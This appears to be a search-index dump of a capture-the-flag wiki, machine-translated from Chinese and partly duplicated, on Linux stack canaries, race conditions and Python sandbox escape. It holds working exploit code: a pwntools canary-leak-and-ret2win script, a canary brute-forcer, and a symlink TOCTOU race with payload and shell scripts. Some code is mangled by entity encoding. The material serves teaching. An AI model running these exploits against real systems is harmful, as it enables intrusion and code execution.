byte of _dl_random to 0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard ( _dl_random ); / / Set the value of Canary to TLS THREAD_SET_STACK_GUARD ( stack_chk_guard ); _dl_random = NULL ; } //THREAD_SET_STACK_GUARD macro is used to set TLS #define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)","title":"Canary Implementation Principle"},{"location":"pwn/linux/mitigation/canary/#canary-bypass-technology","text":"","title":"Canary bypass technology"},{"location":"pwn/linux/mitigation/canary/#preface","text":"Canary is a very effective vulnerability mitigation for stack overflow issues. But it does not mean that Canary can block all stack overflow exploits. Here is a common stack overflow exploit that exists in Canary. Please note that each method has specific environment requirements.","title":"Preface"},{"location":"pwn/linux/mitigation/canary/#canary-leaks-canary","text":"Canary is designed to end in bytes \\x00 , which is meant to ensure that Canary can truncate strings. The idea of leaking Canary in the stack is to overwrite the low byte of Canary to print out the remaining Canary part. This type of utilization requires the existence of a suitable output function, and may require the first overflow to leak Canary, and then overflow the control execution flow again.","title":"Canary leaks Canary"},{"location":"pwn/linux/mitigation/canary/#using-examples","text":"The sample source code for the vulnerability is as follows: // ex2.c #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> void getshell ( void ) { system ( \"/bin/sh\" ); } void init () { setbuf ( stdin , NULL ); setbuf ( stdout , NULL ); setbuf ( stderr , NULL ); } void vuln () { char buf [ 100 ]; for ( int i = 0 ; i < 2 ; i ++ ){ read ( 0 , buf , 0x200 ); printf ( buf ); } } int main ( void ) { init (); puts ( \"Hello Hacker!\" ); vuln (); return 0 ; } Compile as 32bit program and disable PIE protection (NX, ASLR and Canary protection are invoked by default) $ gcc -m32 -no-pie ex2.c -o ex2 First print out the 4-digit Canary by overwriting the last \\x00 byte of Canary After that, calculate the offset, fill Canary into the corresponding overflow position, and implement Ret into the getshell function. #!/usr/bin/env python from pwn import * context . binary = 'ex2' #context.log_level = 'debug' io = process ( & #39;./ ex2&#39;) get_shell = ELF ( \"./ex2\" ) . sym [ \"getshell\" ] io . recvuntil ( & quot ; Hello Hacker ! # leak Canary payload = \"A\" * 100 io . sendline ( payload ) io . recvuntil ( & quot ; A & quot ; * 100 ) Canary = u32 ( io . recv ( 4 )) - 0xa log . info ( \"Canary:\" + hex ( Canary )) # Bypass Canary payload = \" \\x90 \" * 100 + p32 ( Canary ) + \" \\x90 \" * 12 + p32 ( get_shell ) io . send ( payload ) io . recv () io . interactive ()","title":"Using examples"},{"location":"pwn/linux/mitigation/canary/#one-by-one-crack-canary","text":"For Canary, although the Canary is different each time the same process restarts (the same as GS, GS is restarted), but the Canary of each thread in the same process is identical. Also, there is a class that opens the child process interaction through the fork function, because the fork function directly copies the memory of the parent process, so the Canary of each child process created is the same. We can use this feature to completely blast Canary byte by byte. In the famous offset2libc bypassing all protected linux64bit articles, the author is using this way to blast the Canary: This is the Python code for blasting: print \"[+] Brute forcing stack canary \" start = len ( p ) stop = len ( p ) + 8 while len ( p ) < stop : for i in xrange ( 0 , 256 ): res = send2server ( p + chr ( i )) if res != \"\" : p = p + chr ( i ) #print \"\\t[+] Byte found 0x%02x\" % i break if i == 255 : print \"[-] Exploit failed\" sys . exit ( - 1 ) canary = p [ stop : start - 1 : - 1 ] . encode ( \"hex\" ) print \" [+] SSP value is 0x %s \" % canary","title":"one-by-one crack Canary"},{"location":"pwn/linux/mitigation/canary/#hijack-__stack_chk_fail-function","text":"The processing logic that knows that Canary fails will enter the __stack_chk_fail ed function. The __stack_chk_fail ed function is a normal delay binding function that can be hijacked by modifying the GOT table. See ZCTF2017 Login, using the GTS table of __stack_chk_fail by fsb vulnerability, and then using ROP","title":"Hijack __stack_chk_fail function"},{"location":"pwn/linux/mitigation/canary/#override-the-canary-value-stored-in-tls","text":"It is known that Canary is stored in TLS and will be compared using this value before the function returns. When the overflow size is large, it can overwrite the Canary and TLS stored Canary implementations stored on the stack at the same time. See StarCTF2018 babystack","title":"Override the Canary value stored in TLS"},{"location":"pwn/linux/race-condition/introduction/","text":"Race Condition \u00b6 Overview \u00b6 Conditional competition refers to the order in which a system's operations depend on the order of uncontrolled events. When these uncontrolled events do not run the way the developer wants, bugs can occur. This term originally comes from the fact that two electrical signals compete with each other to affect the output. Conditional competition mainly occurs in the following fields Electronic systems, especially logic circuits Computers, especially multithreaded programs and distributed programs. Due to the large number of concurrent programming in the current system, resources are often shared, which often leads to conditional competition loopholes. Here we mainly consider the conditional competition in computer programs. Conditional contention can occur when the results of a piece of software depend on the order of processes or threads. For a simple consideration, you can know that conditional competition requires the following conditions**: Concurrency, ie there are at least two concurrent execution flows. The execution flow here includes execution flows at the threads, processes, tasks, and so on. Shared objects, that is, multiple concurrent streams access the same object. Common shared objects have shared memory, file system, and signals. In general, these shared objects are used to allow multiple program execution flows to communicate with each other. In addition, we call the code to access the shared object critical section . This part should be locked when writing code normally. Change the object, ie at least one control flow will change the state of the competing object. Because if the program just reads the object, it does not create conditional competition. Since the execution flow is highly uncertain at the time of concurrency, conditional competition is relatively difficult to detect, and it is difficult to reproduce and debug. This brings great difficulties to the competition for repair conditions. The effects of conditional competition are also diverse, and the program is executed abnormally and the program crashes. If the conditional contention vulnerability is exploited by an attacker, it is likely that the attacker will gain the privileges of the corresponding system. Here is a simple example. #include <pthread.h> #include <stdio.h> int counter ; void * IncreaseCounter ( void * args ) { counter += 1 ; sleep ( 0.1 ); printf ( \"Thread %d has counter value %d \\n \" , ( unsigned int ) pthread_self (), counter ); } int main () { pthread_t p [ 10 ]; for ( int i = 0 ; i < 10 ; ++ i ) { pthread_create ( & p [ i ], NULL , IncreaseCounter , NULL ); } for ( int i = 0 ; i < 10 ; ++ i ) { pthread_join ( p [ i ], NULL ); } return 0 ; } In general, we may wish to output as follows \u279c 005race_condition ./example1 Thread 1859024640 has counter value 1 Thread 1841583872 has counter value 2 Thread 1832863488 has counter value 3 Thread 1824143104 has counter value 4 Thread 1744828160 has counter value 5 Thread 1736107776 has counter value 6 Thread 1727387392 has counter value 7 Thread 1850304256 has counter value 8 Thread 1709946624 has counter value 9 Thread 1718667008 has counter value 10 However, due to the existence of conditional competition, the final output is often unsatisfactory. \u279c 005 race_condition . / example1 Thread 1417475840 has counter value 2 Thread 1408755456 has counter value 2 Thread 1391314688 has counter value 8 Thread 1356433152 has counter value 8 Thread 1365153536 has counter value 8 Thread 1373873920 has counter value 8 Thread 1382594304 has counter value 8 Thread 1400035072 has counter value 8 Thread 1275066112 has counter value 9 Thread 1266345728 has counter value 10 Think carefully about why conditional competition can happen? Take the following as a specific example The program first executed action1 and then executed action2. The action may be at the application level or at the operating system level. Normally, we want the condition generated by action1 to be satisfied when the program executes action2. But due to the concurrency of the program, it is very likely that the attacker can destroy the conditions generated by action1 in this short time window before action2 is executed. At this time, the attacker's operation competes with action2, so it may affect the execution of the program. So I think the root of the problem is that although the programmer assumes that a certain condition should be satisfied in the corresponding time period, often the condition may be modified in this small time window. Although the interval between this time may be very small, the attacker may still be able to perform some operations (such as computationally intensive operations, Dos attacks) to make the processing speed of the victim machine relatively slower. Form \u00b6 Common conditional competition has the following form. CWE-367: TOCTOU Race Condition \u00b6 Description \u00b6 TOCTOC (Time-of-check Time-of-use) refers to the program will check before using resources (variables, memory, files), but the resources are modified before the program uses the corresponding resources. Some more specific examples are given below. CWE-365: Race Condition in Switch \u00b6 When the program is executing a switch statement, if the value of the switch variable is changed, it can cause unpredictable behavior. Especially after the case statement does not write the code of the break statement, once the switch variable changes, it is likely to change the original logic of the program. CWE-363: Race Condition Enabling Link Following \u00b6 We know that there are two ways to name files in Linux. File path name file descriptor However, the way these two names are resolved to the corresponding object is different. When the file path name is parsed, it is indirectly parsed by the passed path (file name, hard link, soft link)**, and the passed parameters are not the real address (inode) of the corresponding file. File descriptors are resolved by accessing a pointer that points directly to the file. It is because of the indirectness that the time window we mentioned above is produced. Taking the following code as an example, the program checks for the existence of a file before accessing it, and then opens the file and then performs the operation. But if, after checking, the attacker modifies the file to a symbolic link before actually using the file, the program will access the wrong file. The root cause of this kind of conditional competition is the problem of name object binding in the file system. The following functions will use the file name as a parameter: access(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename() , chroot(),... How to avoid this problem? We can use the fstat function to read the file information and store it in the stat structure, and then we can compare this information with our known information to determine if we have read the correct information. Among them, the st_ino and st_dev variables in the stat structure can uniquely represent files. st_ino contains the serial number of the file, ie i-node st_dev contains the device corresponding to the file. CWE-364: Signal Handler Race Condition \u00b6 Overview \u00b6 Conditional competition often occurs in signal handlers because the signal handler supports asynchronous operations. Especially when the signal processing program is **non-reentrant or state sensitive, the attacker may use the conditional competition in the signal processing program to achieve the effect of denial of service attack and code execution. For example, if the free operation is executed in the signal processing program, then a signal is sent again, and then the signal processing program will perform the free operation again. At this time, double free will occur, and then a little operation may be possible. Can achieve the effect of any address write. In general, the common conditions of competition related to signal processing procedures are Signal handlers share common variables and data segments with normal code segments. Share status in different signal handlers. The signal handler itself uses functions that are not reentrant, such as malloc and free. A signal handler handles multiple signals, which in turn can lead to use after free and double free vulnerabilities. Use mechanisms such as setjmp or longjmp to prevent the signal handler from returning to the original program execution flow. Thread safe and reentrant \u00b6 Here is a description of the relationship between thread safety and reentrancy. Thread safe That is, the function can be called by multiple threads without any problems. conditions There are no shared resources themselves There are shared resources that need to be locked. Reusable A function can be run in the same address space by multiple instances at the same time. Reentrant functions can be interrupted, and other code does not lose data integrity when entering the function. So the reentrant function must be thread safe. Reentrant emphasizes that when a single thread executes, it is still safe to re-enter the same subroutine. does not meet the conditions The function body uses a static data structure and is not a constant The function uses the malloc or free function The function uses a standard IO function. The function called is not reentrant. All variables used by the reentrant function are saved in the current [Call Stack] ( https://zh.wikipedia.org/wiki/%E8%B0%83%E7%94%A8%E6%A0%88 ) [Function stack] ( https://zh.wikipedia.org/w/index.php?title=%E5%87%BD%E6%95%B0%E6%A0%88&action=edit&redlink=1)(frame ) . Prevention \u00b6 If you want to eliminate conditional competition, the primary goal is to find the race windows. The so-called competition window is the code segment that accesses the competing object, which gives the attacker a corresponding opportunity to modify the corresponding competing object. In general, if we can make the conflicting competition windows mutually exclusive, then we can eliminate the competition conditions. Synchronization primitive \u00b6 In general, we use synchronization primitives to eliminate race conditions. Common as follows lock variable Usually mutual exclusion, give up the CPU during the wait, enter the idle state, and try automatically after a while. Spinlock, do not give up the CPU while waiting, try it all the time. Conditional variables Condition variables are used to wait instead of being used for locking. Condition variables are used to automatically block a thread until a special condition occurs. Usually condition variables and mutex locks are used at the same time. Critical section object, CRITICAL_SECTION A semaphore that controls the number of threads that can access a critical section, typically greater than one. Pipeline, a shared file used to connect a read process and a write process to communicate between them. Its lifetime does not exceed the lifetime of the process that created the pipeline. Named pipes, which can be as long as the operating system runtime. #Create a pipe mkfifo my_pipe # gzip reads data from a given pipe and compresses the data into out.gz gzip -9 -c < my_pipe > out.gz & #\u9001\u6570\u636e\u6570\u636e\u6570\u636e cat file > my_pipe Deadlock \u00b6 Overview \u00b6 When the synchronization primitive is used inappropriately, the process may be deadlocked. When two or more execution flows block each other and cannot continue execution, a deadlock occurs. In fact, the deadlock is mainly because in the execution flow of the conflict, there is a loop waiting execution flow, that is, each execution flow in the loop waits to obtain a resource while trying to obtain the next resource. As shown in the figure below, both P1 and P2 processes require resources to continue running. P1 owns resource R2 and needs additional resource R1 to run. P2 owns resource R1 and needs additional resource R2 to run. Both sides wait for each other and no one can run. In general, deadlocks have the following four requirements: Mutually exclusive, resources are mutually exclusive. Hold and wait, hold existing resources while waiting for the next resource. Cannot be preempted. Before the resources obtained by the process are not used, the resource applicant cannot forcibly seize resources from the resource occupants, but can only be released by the occupant process of the resource. Loop wait, loop waiting for resources. And if you want to eliminate the deadlock, it is to break the four necessary conditions above. In addition, the deadlock may be due to the following reasons Processor speed Changes in the process or thread scheduling algorithm Different memory limits during the execution process. Any asynchronous event that can interrupt program execution. influences \u00b6 Deadlocks typically cause a denial of service attack. Detection \u00b6 So, when it comes to this, is it possible for us to detect conditional competition loopholes? At present, there is indeed research in this area, and it is mainly detected from two aspects of static analysis and dynamic analysis. Static detection \u00b6 Currently known static detection tools are available [Flawfinder] ( http://www.dwheeler.com/flawfinder/ ) Target: C/C++ source code steps Create a vulnerability database Simple text pattern matching without any data flow or control flow analysis ThreadSanitizer Target: C++ and GO Implementation: LLVM Dynamic detection \u00b6 Intel Inspector Valgrind \u53c2\u8003 \u00b6 http://www.teraits.com/pitagoras/marcio/segapp/05.ppt http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"Race Condition Introduction"},{"location":"pwn/linux/race-condition/introduction/#race-condition","text":"","title":"Race Condition"},{"location":"pwn/linux/race-condition/introduction/#overview","text":"Conditional competition refers to the order in which a system's operations depend on the order of uncontrolled events. When these uncontrolled events do not run the way the developer wants, bugs can occur. This term originally comes from the fact that two electrical signals compete with each other to affect the output. Conditional competition mainly occurs in the following fields Electronic systems, especially logic circuits Computers, especially multithreaded programs and distributed programs. Due to the large number of concurrent programming in the current system, resources are often shared, which often leads to conditional competition loopholes. Here we mainly consider the conditional competition in computer programs. Conditional contention can occur when the results of a piece of software depend on the order of processes or threads. For a simple consideration, you can know that conditional competition requires the following conditions**: Concurrency, ie there are at least two concurrent execution flows. The execution flow here includes execution flows at the threads, processes, tasks, and so on. Shared objects, that is, multiple concurrent streams access the same object. Common shared objects have shared memory, file system, and signals. In general, these shared objects are used to allow multiple program execution flows to communicate with each other. In addition, we call the code to access the shared object critical section . This part should be locked when writing code normally. Change the object, ie at least one control flow will change the state of the competing object. Because if the program just reads the object, it does not create conditional competition. Since the execution flow is highly uncertain at the time of concurrency, conditional competition is relatively difficult to detect, and it is difficult to reproduce and debug. This brings great difficulties to the competition for repair conditions. The effects of conditional competition are also diverse, and the program is executed abnormally and the program crashes. If the conditional contention vulnerability is exploited by an attacker, it is likely that the attacker will gain the privileges of the corresponding system. Here is a simple example. #include <pthread.h> #include <stdio.h> int counter ; void * IncreaseCounter ( void * args ) { counter += 1 ; sleep ( 0.1 ); printf ( \"Thread %d has counter value %d \\n \" , ( unsigned int ) pthread_self (), counter ); } int main () { pthread_t p [ 10 ]; for ( int i = 0 ; i < 10 ; ++ i ) { pthread_create ( & p [ i ], NULL , IncreaseCounter , NULL ); } for ( int i = 0 ; i < 10 ; ++ i ) { pthread_join ( p [ i ], NULL ); } return 0 ; } In general, we may wish to output as follows \u279c 005race_condition ./example1 Thread 1859024640 has counter value 1 Thread 1841583872 has counter value 2 Thread 1832863488 has counter value 3 Thread 1824143104 has counter value 4 Thread 1744828160 has counter value 5 Thread 1736107776 has counter value 6 Thread 1727387392 has counter value 7 Thread 1850304256 has counter value 8 Thread 1709946624 has counter value 9 Thread 1718667008 has counter value 10 However, due to the existence of conditional competition, the final output is often unsatisfactory. \u279c 005 race_condition . / example1 Thread 1417475840 has counter value 2 Thread 1408755456 has counter value 2 Thread 1391314688 has counter value 8 Thread 1356433152 has counter value 8 Thread 1365153536 has counter value 8 Thread 1373873920 has counter value 8 Thread 1382594304 has counter value 8 Thread 1400035072 has counter value 8 Thread 1275066112 has counter value 9 Thread 1266345728 has counter value 10 Think carefully about why conditional competition can happen? Take the following as a specific example The program first executed action1 and then executed action2. The action may be at the application level or at the operating system level. Normally, we want the condition generated by action1 to be satisfied when the program executes action2. But due to the concurrency of the program, it is very likely that the attacker can destroy the conditions generated by action1 in this short time window before action2 is executed. At this time, the attacker's operation competes with action2, so it may affect the execution of the program. So I think the root of the problem is that although the programmer assumes that a certain condition should be satisfied in the corresponding time period, often the condition may be modified in this small time window. Although the interval between this time may be very small, the attacker may still be able to perform some operations (such as computationally intensive operations, Dos attacks) to make the processing speed of the victim machine relatively slower.","title":"Overview"},{"location":"pwn/linux/race-condition/introduction/#form","text":"Common conditional competition has the following form.","title":"Form"},{"location":"pwn/linux/race-condition/introduction/#cwe-367-toctou-race-condition","text":"","title":"CWE-367: TOCTOU Race Condition"},{"location":"pwn/linux/race-condition/introduction/#description","text":"TOCTOC (Time-of-check Time-of-use) refers to the program will check before using resources (variables, memory, files), but the resources are modified before the program uses the corresponding resources. Some more specific examples are given below.","title":"Description"},{"location":"pwn/linux/race-condition/introduction/#cwe-365-race-condition-in-switch","text":"When the program is executing a switch statement, if the value of the switch variable is changed, it can cause unpredictable behavior. Especially after the case statement does not write the code of the break statement, once the switch variable changes, it is likely to change the original logic of the program.","title":"CWE-365: Race Condition in Switch"},{"location":"pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following","text":"We know that there are two ways to name files in Linux. File path name file descriptor However, the way these two names are resolved to the corresponding object is different. When the file path name is parsed, it is indirectly parsed by the passed path (file name, hard link, soft link)**, and the passed parameters are not the real address (inode) of the corresponding file. File descriptors are resolved by accessing a pointer that points directly to the file. It is because of the indirectness that the time window we mentioned above is produced. Taking the following code as an example, the program checks for the existence of a file before accessing it, and then opens the file and then performs the operation. But if, after checking, the attacker modifies the file to a symbolic link before actually using the file, the program will access the wrong file. The root cause of this kind of conditional competition is the problem of name object binding in the file system. The following functions will use the file name as a parameter: access(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename() , chroot(),... How to avoid this problem? We can use the fstat function to read the file information and store it in the stat structure, and then we can compare this information with our known information to determine if we have read the correct information. Among them, the st_ino and st_dev variables in the stat structure can uniquely represent files. st_ino contains the serial number of the file, ie i-node st_dev contains the device corresponding to the file.","title":"CWE-363: Race Condition Enabling Link Following"},{"location":"pwn/linux/race-condition/introduction/#cwe-364-signal-handler-race-condition","text":"","title":"CWE-364: Signal Handler Race Condition"},{"location":"pwn/linux/race-condition/introduction/#overview_1","text":"Conditional competition often occurs in signal handlers because the signal handler supports asynchronous operations. Especially when the signal processing program is **non-reentrant or state sensitive, the attacker may use the conditional competition in the signal processing program to achieve the effect of denial of service attack and code execution. For example, if the free operation is executed in the signal processing program, then a signal is sent again, and then the signal processing program will perform the free operation again. At this time, double free will occur, and then a little operation may be possible. Can achieve the effect of any address write. In general, the common conditions of competition related to signal processing procedures are Signal handlers share common variables and data segments with normal code segments. Share status in different signal handlers. The signal handler itself uses functions that are not reentrant, such as malloc and free. A signal handler handles multiple signals, which in turn can lead to use after free and double free vulnerabilities. Use mechanisms such as setjmp or longjmp to prevent the signal handler from returning to the original program execution flow.","title":"Overview"},{"location":"pwn/linux/race-condition/introduction/#thread-safe-and-reentrant","text":"Here is a description of the relationship between thread safety and reentrancy. Thread safe That is, the function can be called by multiple threads without any problems. conditions There are no shared resources themselves There are shared resources that need to be locked. Reusable A function can be run in the same address space by multiple instances at the same time. Reentrant functions can be interrupted, and other code does not lose data integrity when entering the function. So the reentrant function must be thread safe. Reentrant emphasizes that when a single thread executes, it is still safe to re-enter the same subroutine. does not meet the conditions The function body uses a static data structure and is not a constant The function uses the malloc or free function The function uses a standard IO function. The function called is not reentrant. All variables used by the reentrant function are saved in the current [Call Stack] ( https://zh.wikipedia.org/wiki/%E8%B0%83%E7%94%A8%E6%A0%88 ) [Function stack] ( https://zh.wikipedia.org/w/index.php?title=%E5%87%BD%E6%95%B0%E6%A0%88&action=edit&redlink=1)(frame ) .","title":"Thread safe and reentrant"},{"location":"pwn/linux/race-condition/introduction/#prevention","text":"If you want to eliminate conditional competition, the primary goal is to find the race windows. The so-called competition window is the code segment that accesses the competing object, which gives the attacker a corresponding opportunity to modify the corresponding competing object. In general, if we can make the conflicting competition windows mutually exclusive, then we can eliminate the competition conditions.","title":"Prevention"},{"location":"pwn/linux/race-condition/introduction/#synchronization-primitive","text":"In general, we use synchronization primitives to eliminate race conditions. Common as follows lock variable Usually mutual exclusion, give up the CPU during the wait, enter the idle state, and try automatically after a while. Spinlock, do not give up the CPU while waiting, try it all the time. Conditional variables Condition variables are used to wait instead of being used for locking. Condition variables are used to automatically block a thread until a special condition occurs. Usually condition variables and mutex locks are used at the same time. Critical section object, CRITICAL_SECTION A semaphore that controls the number of threads that can access a critical section, typically greater than one. Pipeline, a shared file used to connect a read process and a write process to communicate between them. Its lifetime does not exceed the lifetime of the process that created the pipeline. Named pipes, which can be as long as the operating system runtime. #Create a pipe mkfifo my_pipe # gzip reads data from a given pipe and compresses the data into out.gz gzip -9 -c < my_pipe > out.gz & #\u9001\u6570\u636e\u6570\u636e\u6570\u636e cat file > my_pipe","title":"Synchronization primitive"},{"location":"pwn/linux/race-condition/introduction/#deadlock","text":"","title":"Deadlock"},{"location":"pwn/linux/race-condition/introduction/#overview_2","text":"When the synchronization primitive is used inappropriately, the process may be deadlocked. When two or more execution flows block each other and cannot continue execution, a deadlock occurs. In fact, the deadlock is mainly because in the execution flow of the conflict, there is a loop waiting execution flow, that is, each execution flow in the loop waits to obtain a resource while trying to obtain the next resource. As shown in the figure below, both P1 and P2 processes require resources to continue running. P1 owns resource R2 and needs additional resource R1 to run. P2 owns resource R1 and needs additional resource R2 to run. Both sides wait for each other and no one can run. In general, deadlocks have the following four requirements: Mutually exclusive, resources are mutually exclusive. Hold and wait, hold existing resources while waiting for the next resource. Cannot be preempted. Before the resources obtained by the process are not used, the resource applicant cannot forcibly seize resources from the resource occupants, but can only be released by the occupant process of the resource. Loop wait, loop waiting for resources. And if you want to eliminate the deadlock, it is to break the four necessary conditions above. In addition, the deadlock may be due to the following reasons Processor speed Changes in the process or thread scheduling algorithm Different memory limits during the execution process. Any asynchronous event that can interrupt program execution.","title":"Overview"},{"location":"pwn/linux/race-condition/introduction/#influences","text":"Deadlocks typically cause a denial of service attack.","title":"influences"},{"location":"pwn/linux/race-condition/introduction/#detection","text":"So, when it comes to this, is it possible for us to detect conditional competition loopholes? At present, there is indeed research in this area, and it is mainly detected from two aspects of static analysis and dynamic analysis.","title":"Detection"},{"location":"pwn/linux/race-condition/introduction/#static-detection","text":"Currently known static detection tools are available [Flawfinder] ( http://www.dwheeler.com/flawfinder/ ) Target: C/C++ source code steps Create a vulnerability database Simple text pattern matching without any data flow or control flow analysis ThreadSanitizer Target: C++ and GO Implementation: LLVM","title":"Static detection"},{"location":"pwn/linux/race-condition/introduction/#dynamic-detection","text":"Intel Inspector Valgrind","title":"Dynamic detection"},{"location":"pwn/linux/race-condition/introduction/#_1","text":"http://www.teraits.com/pitagoras/marcio/segapp/05.ppt http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"\u53c2\u8003"},{"location":"pwn/linux/race-condition/problem/","text":"\u9898 \u00b6 Construction example \u00b6 Source code \u00b6 The source code is as follows #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <unistd.h> void showflag () { system ( \"cat flag\" ); } void vuln ( char * file , char * buf ) { int number ; int index = 0 ; int fd = open ( file , O_RDONLY ); if ( fd == -1 ) { perror ( \"open file failed!!\" ); return ; } while ( 1 ) { number = read ( fd , buf + index , 128 ); if ( number <= 0 ) { break ; } index += number ; } buf [ index + 1 ] = '\\x00' ; } void check ( char * file ) { struct stat tmp ; if ( strcmp ( file , \"flag\" ) == 0 ) { puts ( \"file can not be flag!!\" ); exit ( 0 ); } stat ( file , & tmp ); if ( tmp . st_size > 255 ) { puts ( \"file size is too large!!\" ); exit ( 0 ); } } int main ( int argc , char * argv [ argc ]) { char buf [ 256 ]; if ( argc == 2 ) { check ( argv [ 1 ]); vuln ( argv [ 1 ], buf ); } else { puts ( \"Usage ./prog <filename>\" ); } return 0 ; } Analysis \u00b6 It can be seen that the basic flow of the program is as follows Check if the incoming command line argument is \"flag\" and if so, exit. Check if the file size corresponding to the incoming command line parameter is greater than 255. If so, exit directly. Read the contents of the file corresponding to the command line parameters into buf. The size of buf is 256. It seems that we checked the size of the file, and the size of the buf can also meet the corresponding maximum size, but there is a problem of conditional competition. If we delete the corresponding file after the program has checked the corresponding file size and symbolically link to another larger file, the program will read more content, which will cause stack overflow. The basic idea \u00b6 Well, the basic idea is coming, we want to get the corresponding flag content. Then we only need to modify the return address of the corresponding main function through stack overflow. The address of showflag can be obtained through disassembly and debugging, and the corresponding payload is obtained. \u279c race test cat payload . py from pwn import * test = ELF ( & #39;./ test&#39;) payload = 'a' * 0x100 + 'b' * 8 + p64 ( test . symbols [ 'showflag' ]) open ( 'big' , 'w' ) . write ( payload ) The script that competes for the two conditions is Exp racing test cat exp.sh #! / Bin / sh for i in ` seq 500 ` do cp small fake sleep 0 .000008 rm fake ln -s big fake rm fake done Run race test cat run.sh #! / Bin / sh for i in ` seq 1000 ` do ./test fake done Where exp is used to compete to delete the fake file in the corresponding window while performing symbolic links. Run is used to execute the program. Specific effects \u00b6 \u279c race test ( sh exp.sh & amp ; ) & amp ;& amp ; sh run.sh [ ... ] file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory flag { race_condition_succeed! } [ ... ] The key to success is the timing of the corresponding sleep . \u53c2\u8003 \u00b6 http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"Example"},{"location":"pwn/linux/race-condition/problem/#_1","text":"","title":"\u9898"},{"location":"pwn/linux/race-condition/problem/#construction-example","text":"","title":"Construction example"},{"location":"pwn/linux/race-condition/problem/#source-code","text":"The source code is as follows #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <unistd.h> void showflag () { system ( \"cat flag\" ); } void vuln ( char * file , char * buf ) { int number ; int index = 0 ; int fd = open ( file , O_RDONLY ); if ( fd == -1 ) { perror ( \"open file failed!!\" ); return ; } while ( 1 ) { number = read ( fd , buf + index , 128 ); if ( number <= 0 ) { break ; } index += number ; } buf [ index + 1 ] = '\\x00' ; } void check ( char * file ) { struct stat tmp ; if ( strcmp ( file , \"flag\" ) == 0 ) { puts ( \"file can not be flag!!\" ); exit ( 0 ); } stat ( file , & tmp ); if ( tmp . st_size > 255 ) { puts ( \"file size is too large!!\" ); exit ( 0 ); } } int main ( int argc , char * argv [ argc ]) { char buf [ 256 ]; if ( argc == 2 ) { check ( argv [ 1 ]); vuln ( argv [ 1 ], buf ); } else { puts ( \"Usage ./prog <filename>\" ); } return 0 ; }","title":"Source code"},{"location":"pwn/linux/race-condition/problem/#analysis","text":"It can be seen that the basic flow of the program is as follows Check if the incoming command line argument is \"flag\" and if so, exit. Check if the file size corresponding to the incoming command line parameter is greater than 255. If so, exit directly. Read the contents of the file corresponding to the command line parameters into buf. The size of buf is 256. It seems that we checked the size of the file, and the size of the buf can also meet the corresponding maximum size, but there is a problem of conditional competition. If we delete the corresponding file after the program has checked the corresponding file size and symbolically link to another larger file, the program will read more content, which will cause stack overflow.","title":"Analysis"},{"location":"pwn/linux/race-condition/problem/#the-basic-idea","text":"Well, the basic idea is coming, we want to get the corresponding flag content. Then we only need to modify the return address of the corresponding main function through stack overflow. The address of showflag can be obtained through disassembly and debugging, and the corresponding payload is obtained. \u279c race test cat payload . py from pwn import * test = ELF ( & #39;./ test&#39;) payload = 'a' * 0x100 + 'b' * 8 + p64 ( test . symbols [ 'showflag' ]) open ( 'big' , 'w' ) . write ( payload ) The script that competes for the two conditions is Exp racing test cat exp.sh #! / Bin / sh for i in ` seq 500 ` do cp small fake sleep 0 .000008 rm fake ln -s big fake rm fake done Run race test cat run.sh #! / Bin / sh for i in ` seq 1000 ` do ./test fake done Where exp is used to compete to delete the fake file in the corresponding window while performing symbolic links. Run is used to execute the program.","title":"The basic idea"},{"location":"pwn/linux/race-condition/problem/#specific-effects","text":"\u279c race test ( sh exp.sh & amp ; ) & amp ;& amp ; sh run.sh [ ... ] file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory flag { race_condition_succeed! } [ ... ] The key to success is the timing of the corresponding sleep .","title":"Specific effects"},{"location":"pwn/linux/race-condition/problem/#_2","text":"http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"\u53c2\u8003"},{"location":"pwn/linux/sandbox/python-sandbox-escape/","text":"Python sandbox \u00b6 The so-called Python sandbox, in a certain way to simulate the Python terminal, to achieve user use of Python. Python Sandbox Escape Some Ways \u00b6 What we usually call Python sandbox escaping is to bypass the simulated Python terminal and ultimately implement command execution. Import module \u00b6 In Python's built-in functions, there are some functions that help us implement arbitrary command execution: os.system () os.popen () commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() There are usually three ways 